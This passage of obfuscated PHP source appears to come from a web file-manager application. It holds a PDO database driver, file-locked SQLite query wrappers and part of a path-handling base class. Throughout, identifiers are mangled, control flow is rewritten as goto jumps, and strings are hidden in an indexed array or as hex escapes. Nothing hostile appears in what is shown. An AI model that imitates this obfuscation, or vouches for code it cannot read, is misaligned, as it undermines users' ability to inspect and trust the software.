= array()) { goto D«ØŸÏ£Ş±; B“à³õÃ¿: if (!1 === $f¥ííÛ†«˜) { $this->error(); return !1; } else { return $this->getAll(); } goto AªÚÊİÚåÁ; B­¦™‰›Æ…: $this->queryStr = $cìàŞ¥ğá; if (!empty($CÌÈ§ŞèáÈ)) { $this->queryStr .= $eóÙù¡†Í[825] . print_r($CÌÈ§ŞèáÈ, !0) . $eóÙù¡†Í[826]; } if (!empty($this->PDOStatement)) { $this->free(); } goto eÅÛëèĞËˆ; fì¨›ßÊ’ª: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $f¥ííÛ†«˜ = $this->PDOStatement->execute($CÌÈ§ŞèáÈ); $this->debug(); goto B“à³õÃ¿; D«ØŸÏ£Ş±: $eóÙù¡†Í =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B­¦™‰›Æ…; eÅÛëèĞËˆ: think_action_status($eóÙù¡†Í[19], 1); think_status($eóÙù¡†Í[20]); $this->PDOStatement = $this->_linkID->prepare($cìàŞ¥ğá); goto fì¨›ßÊ’ª; AªÚÊİÚåÁ: } public function execute($e²Ş®Ì‡ƒˆ, $c™„Ïè™“Ä = array()) { goto aŒªñíğî; eí²Øä÷õ: if ($this->dbType == $F¤ÈÍ©Æƒ•[819]) { if (preg_match($F¤ÈÍ©Æƒ•[827], $this->queryStr, $D£ÁñàÑ–‹)) { $this->table = think_config($F¤ÈÍ©Æƒ•[828]) . str_ireplace(think_config($F¤ÈÍ©Æƒ•[829]), $F¤ÈÍ©Æƒ•[357], $D£ÁñàÑ–‹[2]); $E©áŸŞëåÕ = (bool) $this->query($F¤ÈÍ©Æƒ•[830] . strtoupper($this->table) . $F¤ÈÍ©Æƒ•[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($F¤ÈÍ©Æƒ•[21], 1); goto A¿ªÒÆì; aæÃÓî¦£´: $this->queryStr = $e²Ş®Ì‡ƒˆ; if (!empty($c™„Ïè™“Ä)) { $this->queryStr .= $F¤ÈÍ©Æƒ•[825] . print_r($c™„Ïè™“Ä, !0) . $F¤ÈÍ©Æƒ•[826]; } $E©áŸŞëåÕ = !1; goto eí²Øä÷õ; A¿ªÒÆì: think_status($F¤ÈÍ©Æƒ•[20]); $this->PDOStatement = $this->_linkID->prepare($e²Ş®Ì‡ƒˆ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto dÅÈ§ê›œ; dÅÈ§ê›œ: $EÇ¶“Œ å = $this->PDOStatement->execute($c™„Ïè™“Ä); $this->debug(); if (!1 === $EÇ¶“Œ å) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($E©áŸŞëåÕ || preg_match($F¤ÈÍ©Æƒ•[831], $e²Ş®Ì‡ƒˆ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto dÎ…½˜¥; aŒªñíğî: $F¤ÈÍ©Æƒ• =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aæÃÓî¦£´; dÎ…½˜¥: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÃ”Ú£‹ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dÃ”Ú£‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E±­îÌõ ¿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$E±­îÌõ ¿) { $this->error(); return !1; } } return !0; } private function getAll() { $b¸Â¢†…—Ö = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($b¸Â¢†…—Ö); return $b¸Â¢†…—Ö; } public function getFields($Aø¬ÓìòÍ’) { goto eÛ«››“­¢; AŸèöĞƒÑ¼: $fİÆè—ø­ = $this->query($EÂÚ±†ø¿Ë); $aîœÚˆÎ«Æ = array(); if ($fİÆè—ø­) { foreach ($fİÆè—ø­ as $Câéï¬œª => $aïšƒîêÂ±) { $aïšƒîêÂ± = array_change_key_case($aïšƒîêÂ±); $aïšƒîêÂ±[$F‘ •ñŸâµ[28]] = isset($aïšƒîêÂ±[$F‘ •ñŸâµ[28]]) ? $aïšƒîêÂ±[$F‘ •ñŸâµ[28]] : $F‘ •ñŸâµ[357]; $aïšƒîêÂ±[$F‘ •ñŸâµ[29]] = isset($aïšƒîêÂ±[$F‘ •ñŸâµ[29]]) ? $aïšƒîêÂ±[$F‘ •ñŸâµ[29]] : $F‘ •ñŸâµ[357]; $FÖÁÆ–âÊó = isset($aïšƒîêÂ±[$F‘ •ñŸâµ[257]]) ? $aïšƒîêÂ±[$F‘ •ñŸâµ[257]] : $aïšƒîêÂ±[$F‘ •ñŸâµ[28]]; $aîœÚˆÎ«Æ[$FÖÁÆ–âÊó] = array($F‘ •ñŸâµ[28] => $FÖÁÆ–âÊó, $F‘ •ñŸâµ[29] => $aïšƒîêÂ±[$F‘ •ñŸâµ[29]], $F‘ •ñŸâµ[31] => (bool) (isset($aïšƒîêÂ±[$F‘ •ñŸâµ[99]]) && $aïšƒîêÂ±[$F‘ •ñŸâµ[99]] === $F‘ •ñŸâµ[33] || isset($aïšƒîêÂ±[$F‘ •ñŸâµ[31]]) && $aïšƒîêÂ±[$F‘ •ñŸâµ[31]] === $F‘ •ñŸâµ[33]), $F‘ •ñŸâµ[34] => isset($aïšƒîêÂ±[$F‘ •ñŸâµ[34]]) ? $aïšƒîêÂ±[$F‘ •ñŸâµ[34]] : (isset($aïšƒîêÂ±[$F‘ •ñŸâµ[53]]) ? $aïšƒîêÂ±[$F‘ •ñŸâµ[53]] : $F‘ •ñŸâµ[357]), $F‘ •ñŸâµ[36] => isset($aïšƒîêÂ±[$F‘ •ñŸâµ[89]]) ? strtolower($aïšƒîêÂ±[$F‘ •ñŸâµ[89]]) == $F‘ •ñŸâµ[38] : (isset($aïšƒîêÂ±[$F‘ •ñŸâµ[54]]) ? $aïšƒîêÂ±[$F‘ •ñŸâµ[54]] : !1), $F‘ •ñŸâµ[39] => isset($aïšƒîêÂ±[$F‘ •ñŸâµ[848]]) ? strtolower($aïšƒîêÂ±[$F‘ •ñŸâµ[848]]) == $F‘ •ñŸâµ[41] : (isset($aïšƒîêÂ±[$F‘ •ñŸâµ[89]]) ? $aïšƒîêÂ±[$F‘ •ñŸâµ[89]] : !1)); } } goto c‰ö¸·©»ë; eÛ«››“­¢: $F‘ •ñŸâµ =& $_SERVER[Ä¿Ş°¨]; $this->initConnect(!0); if (think_config($F‘ •ñŸâµ[832])) { $EÂÚ±†ø¿Ë = str_replace($F‘ •ñŸâµ[833], $Aø¬ÓìòÍ’, think_config($F‘ •ñŸâµ[832])); } else { switch ($this->dbType) { case $F‘ •ñŸâµ[816]: case $F‘ •ñŸâµ[834]: $EÂÚ±†ø¿Ë = "\123\x45\114\x45\103\x54\x20\x20\40\x63\x6f\x6c\165\x6d\x6e\x5f\156\141\155\x65\40\141\x73\x20\x27\x4e\x61\155\145\47\x2c\40\x20\x20\144\141\x74\141\137\x74\x79\x70\145\x20\x61\x73\x20\x27\x54\x79\x70\x65\x27\54\x20\x20\40\x63\157\154\165\x6d\x6e\x5f\x64\145\x66\141\x75\154\x74\x20\141\163\40\47\x44\145\146\141\x75\x6c\x74\x27\54\40\40\40\151\x73\137\156\x75\154\x6c\141\142\154\145\40\141\163\x20\47\116\165\154\x6c\x27\xa\x9\11\106\x52\117\x4d\11\151\156\x66\x6f\162\155\x61\164\151\x6f\x6e\x5f\x73\x63\150\x65\155\x61\x2e\164\x61\142\154\x65\x73\x20\101\123\40\164\12\x9\x9\112\x4f\x49\116\x9\151\x6e\146\x6f\162\155\x61\164\151\157\156\137\163\143\x68\x65\155\x61\56\x63\157\154\x75\x6d\x6e\x73\x20\x41\123\x20\x63\12\11\x9\117\x4e\x20\x20\164\x2e\164\141\x62\154\145\x5f\x63\x61\x74\x61\154\157\x67\x20\75\x20\143\x2e\164\x61\142\x6c\145\137\x63\141\164\141\154\157\147\xa\11\11\x41\x4e\104\40\164\x2e\164\141\x62\x6c\x65\x5f\x73\143\150\x65\155\x61\40\x3d\x20\143\56\164\x61\142\154\x65\x5f\x73\143\150\x65\155\x61\xa\11\x9\x41\116\x44\x20\x74\x2e\x74\x61\142\154\145\x5f\x6e\141\155\x65\40\x3d\x20\143\x2e\164\141\142\x6c\145\137\x6e\x61\155\145\xa\x9\x9\x57\110\x45\x52\105\x20\x20\x20\x74\x2e\164\x61\x62\x6c\x65\x5f\x6e\141\x6d\x65\40\x3d\40\47{$Aø¬ÓìòÍ’}\x27"; break; case $F‘ •ñŸâµ[835]: $EÂÚ±†ø¿Ë = $F‘ •ñŸâµ[836] . $Aø¬ÓìòÍ’ . $F‘ •ñŸâµ[837]; break; case $F‘ •ñŸâµ[817]: case $F‘ •ñŸâµ[819]: $EÂÚ±†ø¿Ë = $F‘ •ñŸâµ[838] . $F‘ •ñŸâµ[839] . $F‘ •ñŸâµ[840] . strtoupper($Aø¬ÓìòÍ’) . $F‘ •ñŸâµ[841] . strtoupper($Aø¬ÓìòÍ’) . $F‘ •ñŸâµ[842]; break; case $F‘ •ñŸâµ[843]: $EÂÚ±†ø¿Ë = $F‘ •ñŸâµ[844] . $Aø¬ÓìòÍ’ . $F‘ •ñŸâµ[845]; break; case $F‘ •ñŸâµ[818]: break; case $F‘ •ñŸâµ[846]: default: $EÂÚ±†ø¿Ë = $F‘ •ñŸâµ[847] . ($this->dbType == $F‘ •ñŸâµ[846] ? "\x60{$Aø¬ÓìòÍ’}\140" : $Aø¬ÓìòÍ’); } } goto AŸèöĞƒÑ¼; c‰ö¸·©»ë: return $aîœÚˆÎ«Æ; goto E˜×Âçß±; E˜×Âçß±: } public function getTables($D¨›¬š¿•È = '') { $C›“Â»ëº =& $_SERVER[Ä¿Ş°¨]; if (think_config($C›“Â»ëº[849])) { $Cİ©ĞßØ÷¸ = str_replace($C›“Â»ëº[850], $D¨›¬š¿•È, think_config($C›“Â»ëº[849])); } else { switch ($this->dbType) { case $C›“Â»ëº[817]: case $C›“Â»ëº[819]: $Cİ©ĞßØ÷¸ = $C›“Â»ëº[851]; break; case $C›“Â»ëº[816]: case $C›“Â»ëº[834]: $Cİ©ĞßØ÷¸ = $C›“Â»ëº[852]; break; case $C›“Â»ëº[843]: $Cİ©ĞßØ÷¸ = $C›“Â»ëº[853]; break; case $C›“Â»ëº[818]: think_exception(think_lang($C›“Â»ëº[854]) . $C›“Â»ëº[855]); break; case $C›“Â»ëº[835]: $Cİ©ĞßØ÷¸ = $C›“Â»ëº[42] . $C›“Â»ëº[43] . $C›“Â»ëº[44]; break; case $C›“Â»ëº[846]: default: if (!empty($D¨›¬š¿•È)) { $Cİ©ĞßØ÷¸ = $C›“Â»ëº[799] . $D¨›¬š¿•È; } else { $Cİ©ĞßØ÷¸ = $C›“Â»ëº[800]; } } } $BäØø´Ó‡§ = $this->query($Cİ©ĞßØ÷¸); $aå´áÏ¦±Š = array(); foreach ($BäØø´Ó‡§ as $aÂÜ±É => $A«ß©¯‰ëó) { $aå´áÏ¦±Š[$aÂÜ±É] = current($A«ß©¯‰ëó); } return $aå´áÏ¦±Š; } protected function parseLimit($A®•ĞÊ‘“¼) { $bÕã©ÊŠ• =& $_SERVER[Ä¿Ş°¨]; $bÖ¨ù®ºÏ = $bÕã©ÊŠ•[33]; if (!empty($A®•ĞÊ‘“¼)) { switch ($this->dbType) { case $bÕã©ÊŠ•[843]: case $bÕã©ÊŠ•[835]: $A®•ĞÊ‘“¼ = explode($bÕã©ÊŠ•[47], $A®•ĞÊ‘“¼); if (count($A®•ĞÊ‘“¼) > 1) { $bÖ¨ù®ºÏ .= $bÕã©ÊŠ•[48] . $A®•ĞÊ‘“¼[1] . $bÕã©ÊŠ•[49] . $A®•ĞÊ‘“¼[0] . $bÕã©ÊŠ•[50]; } else { $bÖ¨ù®ºÏ .= $bÕã©ÊŠ•[48] . $A®•ĞÊ‘“¼[0] . $bÕã©ÊŠ•[50]; } break; case $bÕã©ÊŠ•[816]: case $bÕã©ÊŠ•[834]: break; case $bÕã©ÊŠ•[818]: break; case $bÕã©ÊŠ•[817]: case $bÕã©ÊŠ•[819]: break; case $bÕã©ÊŠ•[846]: default: $bÖ¨ù®ºÏ .= $bÕã©ÊŠ•[48] . $A®•ĞÊ‘“¼ . $bÕã©ÊŠ•[50]; } } return $bÖ¨ù®ºÏ; } public function parseKey(&$B„ÜªÜ­Æ…, $c×”ØˆØÚ = true) { $Aéî±¸’ê‰ =& $_SERVER[Ä¿Ş°¨]; if ($c×”ØˆØÚ) { $B„ÜªÜ­Æ… = $this->parseKeyCheck($B„ÜªÜ­Æ…); } if ($this->dbType == $Aéî±¸’ê‰[846]) { if ($B„ÜªÜ­Æ… != $Aéî±¸’ê‰[172] && !preg_match($Aéî±¸’ê‰[810], $B„ÜªÜ­Æ…)) { $B„ÜªÜ­Æ… = $Aéî±¸’ê‰[811] . trim($B„ÜªÜ­Æ…, $Aéî±¸’ê‰[811]) . $Aéî±¸’ê‰[811]; } return $B„ÜªÜ­Æ…; } else { return parent::parseKey($B„ÜªÜ­Æ…); } } public function close() { $this->_linkID = null; } public function error() { $B—† ¡Ğƒ =& $_SERVER[Ä¿Ş°¨]; if ($this->PDOStatement) { $d„’˜¯ÃÇ = $this->PDOStatement->errorInfo(); $this->error = $d„’˜¯ÃÇ[1] . $B—† ¡Ğƒ[4] . $d„’˜¯ÃÇ[2]; } else { $this->error = $B—† ¡Ğƒ[33]; } if ($B—† ¡Ğƒ[33] != $this->queryStr) { $this->error .= LNG($B—† ¡Ğƒ[45]) . $this->queryStr; } think_trace($this->error, $B—† ¡Ğƒ[33], $B—† ¡Ğƒ[46]); return $this->error; } public function escapeString($Eº²ÚÓ‹íô) { $CÃäÕ©Æõ‹ =& $_SERVER[Ä¿Ş°¨]; switch ($this->dbType) { case $CÃäÕ©Æõ‹[843]: case $CÃäÕ©Æõ‹[816]: case $CÃäÕ©Æõ‹[834]: case $CÃäÕ©Æõ‹[846]: return addslashes($Eº²ÚÓ‹íô); case $CÃäÕ©Æõ‹[818]: case $CÃäÕ©Æõ‹[835]: case $CÃäÕ©Æõ‹[817]: case $CÃäÕ©Æõ‹[819]: return str_ireplace($CÃäÕ©Æõ‹[55], $CÃäÕ©Æõ‹[56], $Eº²ÚÓ‹íô); } } protected function parseValue($FÁóˆÑŠ¬) { $EË±¦ÀÀ À =& $_SERVER[Ä¿Ş°¨]; if (is_string($FÁóˆÑŠ¬)) { $FÁóˆÑŠ¬ = strpos($FÁóˆÑŠ¬, $EË±¦ÀÀ À[4]) === 0 ? $this->escapeString($FÁóˆÑŠ¬) : $EË±¦ÀÀ À[856] . $this->escapeString($FÁóˆÑŠ¬) . $EË±¦ÀÀ À[856]; } elseif (isset($FÁóˆÑŠ¬[0]) && is_string($FÁóˆÑŠ¬[0]) && strtolower($FÁóˆÑŠ¬[0]) == $EË±¦ÀÀ À[281]) { $FÁóˆÑŠ¬ = $this->escapeString($FÁóˆÑŠ¬[1]); } elseif (is_array($FÁóˆÑŠ¬)) { $FÁóˆÑŠ¬ = array_map(array($this, $EË±¦ÀÀ À[857]), $FÁóˆÑŠ¬); } elseif (is_bool($FÁóˆÑŠ¬)) { $FÁóˆÑŠ¬ = $FÁóˆÑŠ¬ ? $EË±¦ÀÀ À[83] : $EË±¦ÀÀ À[472]; } elseif (is_null($FÁóˆÑŠ¬)) { $FÁóˆÑŠ¬ = $EË±¦ÀÀ À[99]; } return $FÁóˆÑŠ¬; } public function getLastInsertId() { $añéÅµî =& $_SERVER[Ä¿Ş°¨]; switch ($this->dbType) { case $añéÅµî[843]: case $añéÅµî[835]: case $añéÅµî[816]: case $añéÅµî[834]: case $añéÅµî[818]: case $añéÅµî[846]: return $this->_linkID->lastInsertId(); case $añéÅµî[817]: case $añéÅµî[819]: $eêÈìº–°‡ = $this->table; $BÑÓ¤ì = $this->query("\123\x45\114\105\103\124\x20{$eêÈìº–°‡}\56\143\x75\x72\162\166\141\x6c\40\143\165\x72\x72\x76\141\x6c\x20\x46\122\x4f\x4d\x20\144\x75\141\154"); return $BÑÓ¤ì ? $BÑÓ¤ì[0][$añéÅµî[858]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($cÄÆÀÜŸ‰) { goto FÛíÀœ¬ñÕ; B¨ğ¯¢µ¯: if (!$BÔÑ÷õ¡Ş‚) { return !1; } if (flock($BÔÑ÷õ¡Ş‚, LOCK_EX)) { $A‡Êòæİ‹ = parent::query($cÄÆÀÜŸ‰); flock($BÔÑ÷õ¡Ş‚, LOCK_UN); fclose($BÔÑ÷õ¡Ş‚); return $A‡Êòæİ‹; } flock($BÔÑ÷õ¡Ş‚, LOCK_UN); goto fùİ‡Êà; FÛíÀœ¬ñÕ: $A°À‰²¿•× =& $_SERVER[Ä¿Ş°¨]; $D˜”¢â¬ã’ = DATA_PATH . $A°À‰²¿•×[859]; $BÔÑ÷õ¡Ş‚ = fopen($D˜”¢â¬ã’, $A°À‰²¿•×[860]); goto B¨ğ¯¢µ¯; fùİ‡Êà: fclose($BÔÑ÷õ¡Ş‚); show_json($A°À‰²¿•×[861], !1); return !1; goto BœåàÕÇœ; BœåàÕÇœ: } public function execute($EÛÁ·ƒİÑ¿) { goto aÑóÆšêá­; Dâ¥ÁÈâö: fclose($CÙö¨º§ó‚); show_json($CƒîšßÍÅˆ[861], !1); return !1; goto CÛäö¸ÓåÒ; Eš‚¥óĞŠŠ: if (!$CÙö¨º§ó‚) { return !1; } if (flock($CÙö¨º§ó‚, LOCK_EX)) { $D‰–´†¢”© = parent::execute($EÛÁ·ƒİÑ¿); flock($CÙö¨º§ó‚, LOCK_UN); fclose($CÙö¨º§ó‚); return $D‰–´†¢”©; } flock($CÙö¨º§ó‚, LOCK_UN); goto Dâ¥ÁÈâö; aÑóÆšêá­: $CƒîšßÍÅˆ =& $_SERVER[Ä¿Ş°¨]; $FñÌ†²î•‡ = DATA_PATH . $CƒîšßÍÅˆ[859]; $CÙö¨º§ó‚ = fopen($FñÌ†²î•‡, $CƒîšßÍÅˆ[860]); goto Eš‚¥óĞŠŠ; CÛäö¸ÓåÒ: } } class DbSqlite3 extends DbSqlite3Base { public function query($bëÔô‡ø”Ï) { goto DìàÈöÑŒ§; DìàÈöÑŒ§: $e‚ë“¢ß§ =& $_SERVER[Ä¿Ş°¨]; $Dóíƒ±âÏ = DATA_PATH . $e‚ë“¢ß§[859]; $CÍÛùéĞµ = fopen($Dóíƒ±âÏ, $e‚ë“¢ß§[860]); goto CÖ‰àôÉøÔ; CÖ‰àôÉøÔ: if (!$CÍÛùéĞµ) { return !1; } if (flock($CÍÛùéĞµ, LOCK_EX)) { $B½ó¸Â„í = parent::query($bëÔô‡ø”Ï); flock($CÍÛùéĞµ, LOCK_UN); fclose($CÍÛùéĞµ); return $B½ó¸Â„í; } flock($CÍÛùéĞµ, LOCK_UN); goto a“èè•ªéò; a“èè•ªéò: fclose($CÍÛùéĞµ); show_json($e‚ë“¢ß§[861], !1); return !1; goto e”ÈÏ¯‡šã; e”ÈÏ¯‡šã: } public function execute($b«¦ø‰Ø) { goto b‡ŒëÇˆæ‚; Bº¯ÍàÀª: fclose($cçßÍ™Ô‡”); show_json($d¦˜øĞ¡Ö¬[861], !1); return !1; goto cÀÁéÙªô¸; bÄŸØÄÅ¿¡: if (!$cçßÍ™Ô‡”) { return !1; } if (flock($cçßÍ™Ô‡”, LOCK_EX)) { $AÁÃ†‘ªç÷ = parent::execute($b«¦ø‰Ø); flock($cçßÍ™Ô‡”, LOCK_UN); fclose($cçßÍ™Ô‡”); return $AÁÃ†‘ªç÷; } flock($cçßÍ™Ô‡”, LOCK_UN); goto Bº¯ÍàÀª; b‡ŒëÇˆæ‚: $d¦˜øĞ¡Ö¬ =& $_SERVER[Ä¿Ş°¨]; $b ˜´í«êø = DATA_PATH . $d¦˜øĞ¡Ö¬[859]; $cçßÍ™Ô‡” = fopen($b ˜´í«êø, $d¦˜øĞ¡Ö¬[860]); goto bÄŸØÄÅ¿¡; cÀÁéÙªô¸: } } goto AÛ¸‡Â¸Ÿ®; Bò‡¦…¾±: define($_SERVER[Ä¿Ş°¨][1891], 1); define($_SERVER[Ä¿Ş°¨][1892], 2); define($_SERVER[Ä¿Ş°¨][1893], 3); goto c“çƒ¿Ñ±›; EöÃîˆöÂÑ: function beforeShutdownFatalError($bŞˆÒì») { think_exception($bŞˆÒì»); } $_SERVER[$_SERVER[£›Åú§µ][48]] = $Eô£¨ÃëÙ¤($_SERVER[$_SERVER[£›Åú§µ][45]]); $Añ•î³Œ®ò = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto eØ¨±«ó¸; Cæ¬ã„¢: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $B÷‚‡ç²ÒÁ =& $_SERVER[Ä¿Ş°¨]; $this->objectDriver = array($B÷‚‡ç²ÒÁ[57], $B÷‚‡ç²ÒÁ[58], $B÷‚‡ç²ÒÁ[59], $B÷‚‡ç²ÒÁ[60], $B÷‚‡ç²ÒÁ[61], $B÷‚‡ç²ÒÁ[62], $B÷‚‡ç²ÒÁ[63], $B÷‚‡ç²ÒÁ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($A­Ìø‰ÛƒÚ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($A­Ìø‰ÛƒÚ, $_SERVER[Ä¿Ş°¨][8]); } return $A­Ìø‰ÛƒÚ; } public function getPathName($F¨“ ÛàÍ) { return $F¨“ ÛàÍ; } public function iconvApp($F´Ñ®Ïàê) { return $F´Ñ®Ïàê; } public function iconvSystem($BˆÀä‚¬“) { return $BˆÀä‚¬“; } public function iconvTo($eêŞ†°öÍ², $EĞ·À«¿Í…, $EšëÒªæáİ) { goto A²â‹«íÍ•; FÍçÛ²¨ˆ²: $a–Ñ£×†Ğ[$EšëÒªæáİ . $bÃÍ×””´¼[66] . $EĞ·À«¿Í… . $bÃÍ×””´¼[67] . $eêŞ†°öÍ²] = $eêŞ†°öÍ²; $a–Ñ£×†Ğ[$EšëÒªæáİ . $bÃÍ×””´¼[66] . $EĞ·À«¿Í… . $bÃÍ×””´¼[67] . $aÆ¶ìÚ‹Å] = $eêŞ†°öÍ²; $a–Ñ£×†Ğ[$EĞ·À«¿Í… . $bÃÍ×””´¼[66] . $EšëÒªæáİ . $bÃÍ×””´¼[67] . $aÆ¶ìÚ‹Å] = $aÆ¶ìÚ‹Å; goto FğÈÎÏŒ°”; D˜ÍÙå×: $aÆ¶ìÚ‹Å = $aÆ¶ìÚ‹Å ? $aÆ¶ìÚ‹Å : $eêŞ†°öÍ²; if (strstr($aÆ¶ìÚ‹Å, $bÃÍ×””´¼[69])) { $aÆ¶ìÚ‹Å = str_replace($bÃÍ×””´¼[69], $bÃÍ×””´¼[70], $aÆ¶ìÚ‹Å); } $a–Ñ£×†Ğ[$EĞ·À«¿Í… . $bÃÍ×””´¼[66] . $EšëÒªæáİ . $bÃÍ×””´¼[67] . $eêŞ†°öÍ²] = $aÆ¶ìÚ‹Å; goto FÍçÛ²¨ˆ²; A²â‹«íÍ•: $bÃÍ×””´¼ =& $_SERVER[Ä¿Ş°¨]; if (!$eêŞ†°öÍ² || !function_exists($bÃÍ×””´¼[65])) { return $eêŞ†°öÍ²; } static $a–Ñ£×†Ğ = array(); goto d¡Ÿ§õÔ†–; d¡Ÿ§õÔ†–: $d·®«Õ«Ê  = $EĞ·À«¿Í… . $bÃÍ×””´¼[66] . $EšëÒªæáİ . $bÃÍ×””´¼[67] . $eêŞ†°öÍ²; if (isset($a–Ñ£×†Ğ[$d·®«Õ«Ê ])) { return $a–Ñ£×†Ğ[$d·®«Õ«Ê ]; } if (function_exists($bÃÍ×””´¼[68])) { $aÆ¶ìÚ‹Å = @mb_convert_encoding($eêŞ†°öÍ², $EšëÒªæáİ, $EĞ·À«¿Í…); } else { $aÆ¶ìÚ‹Å = @iconv($EĞ·À«¿Í…, $EšëÒªæáİ, $eêŞ†°öÍ²); } goto D˜ÍÙå×; FğÈÎÏŒ°”: return $aÆ¶ìÚ‹Å; goto cÊ‚Ú©İÈˆ; cÊ‚Ú©İÈˆ: } public function getPathInner($fáôĞ²¡Û‹) { $e‡Êª°©ˆ = IO::init($fáôĞ²¡Û‹); return $e‡Êª°©ˆ->path; } public function getPathOuter($cŞ¯‘Ê˜‚†) { $C³“ÄÌ¤Òš =& $_SERVER[Ä¿Ş°¨]; $f àÙéÄ¯• = strlen(trim($this->pathBase, $C³“ÄÌ¤Òš[8])); $cŞ¯‘Ê˜‚† = substr(trim($cŞ¯‘Ê˜‚†, $C³“ÄÌ¤Òš[8]), $f àÙéÄ¯•); return $this->pathDriver . $C³“ÄÌ¤Òš[8] . ltrim($cŞ¯‘Ê˜‚†, $C³“ÄÌ¤Òš[8]); } public function isParentOf($bÄùÂÕÔ‡, $Câîò†‰¨Ì) { $c¤£§º¥™Ï =& $_SERVER[Ä¿Ş°¨]; $bÄùÂÕÔ‡ = rtrim(strtolower($bÄùÂÕÔ‡), $c¤£§º¥™Ï[8]) . $c¤£§º¥™Ï[8]; $Câîò†‰¨Ì = rtrim(strtolower($Câîò†‰¨Ì), $c¤£§º¥™Ï[8]) . $c¤£§º¥™Ï[8]; $F‡ë«Ì‚ƒ = strpos($Câîò†‰¨Ì, $bÄùÂÕÔ‡) === 0; return $F‡ë«Ì‚ƒ; } public function getType() { $BŸ“ºˆ„ÒÙ =& $_SERVER[Ä¿Ş°¨]; $C¹×é«èÜ = str_replace($BŸ“ºˆ„ÒÙ[71], $BŸ“ºˆ„ÒÙ[33], get_class($this)); return strtolower($C¹×é«èÜ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($a„µ÷ÌÆ¬­, $D³³Ì¯×¾Ä) { $A°à’°ïÁ =& $_SERVER[Ä¿Ş°¨]; $b‚ÙãîŠäˆ = rtrim($a„µ÷ÌÆ¬­, $A°à’°ïÁ[8]) . $A°à’°ïÁ[8] . $D³³Ì¯×¾Ä; $bó‚Æ¶ôƒ = $this->exist($b‚ÙãîŠäˆ); return $bó‚Æ¶ôƒ ? $b‚ÙãîŠäˆ : !1; } public function renameObject($CŠ˜Œ¶Ï Ë, $aÉ ç—†É´) { goto F¢Í½ë¶å½; A¯¥ÜÍëÀ«: return $E¨èß³åŸ· ? $aÉ ç—†É´ : !1; goto b¹õ¨³‚•©; F¢Í½ë¶å½: $e¬àÁå¡ß =& $_SERVER[Ä¿Ş°¨]; $aæºçàï¦ª = $aÉ ç—†É´; Hook::trigger($e¬àÁå¡ß[72], $this, $CŠ˜Œ¶Ï Ë, $this, $this->pathFather($CŠ˜Œ¶Ï Ë) . $aÉ ç—†É´); goto a‘ƒçåÏÇª; a‘ƒçåÏÇª: $CŠ˜Œ¶Ï Ë = $this->getPathOuter($CŠ˜Œ¶Ï Ë); $aÉ ç—†É´ = $this->pathFather($CŠ˜Œ¶Ï Ë) . $aÉ ç—†É´; if (IO::isFile($CŠ˜Œ¶Ï Ë)) { $E¨èß³åŸ· = IO::copy($CŠ˜Œ¶Ï Ë, $this->pathFather($CŠ˜Œ¶Ï Ë), REPEAT_RENAME_FOLDER, $aæºçàï¦ª); if ($E¨èß³åŸ·) { IO::remove($CŠ˜Œ¶Ï Ë); } } else { $E¨èß³åŸ· = IO::mkdir($aÉ ç—†É´); if (!$E¨èß³åŸ·) { return !1; } $AÏô”ÊÁ« = IO::listPath($CŠ˜Œ¶Ï Ë, !0); $f˜ê˜õ’Î§ = array_merge($AÏô”ÊÁ«[$e¬àÁå¡ß[73]], $AÏô”ÊÁ«[$e¬àÁå¡ß[74]]); foreach ($f˜ê˜õ’Î§ as $A¸ê—¿Â‘„) { IO::move($A¸ê—¿Â‘„[$e¬àÁå¡ß[75]], $aÉ ç—†É´, REPEAT_RENAME_FOLDER); } IO::remove($CŠ˜Œ¶Ï Ë); } goto A¯¥ÜÍëÀ«; b¹õ¨³‚•©: } public function tempFile($BÈ‘™‚¶³ç = '', $d ™¬¯¥ = '') { goto A»ÍÓ½„Ğ; A»ÍÓ½„Ğ: if (!$BÈ‘™‚¶³ç) { $BÈ‘™‚¶³ç = rand_string(15); } $f×±Ëê–” = TEMP_FILES . rand_string(15) . $_SERVER[Ä¿Ş°¨][8]; @mkdir($f×±Ëê–”, 511, !0); goto c–Ê¢ŠÂ»Â; c–Ê¢ŠÂ»Â: $eéí¿Ü‘… = $f×±Ëê–” . $BÈ‘™‚¶³ç; @touch($eéí¿Ü‘…); if ($d ™¬¯¥) { file_put_contents($eéí¿Ü‘…, $d ™¬¯¥); } goto F…Ô°’“Ú; F…Ô°’“Ú: return $eéí¿Ü‘…; goto eÈ‚ƒ¾ÏÒ£; eÈ‚ƒ¾ÏÒ£: } public function tempFileRemve($c«³ùôâ…ô) { @unlink($c«³ùôâ…ô); @rmdir($this->pathFather($c«³ùôâ…ô)); } public function mkfile($fØ´ŞÊö‘©, $A…»ÒÀˆ¢Å = '', $F—¿¤´ß–™ = REPEAT_RENAME) { } public function mkdir($EºŒâÜÖÃƒ, $EŠÙ²òÈĞÜ = REPEAT_SKIP) { } public function copyFile($C’íˆ‚áÚÛ, $Aê£†ô‚°) { } public function moveFile($Dç°ĞÃßÉ, $bÁÀµ’Ø‚ó) { } public function remove($cŸ¦½Ê¬ƒ) { if ($this->isFile($cŸ¦½Ê¬ƒ)) { return $this->delFile($cŸ¦½Ê¬ƒ); } return 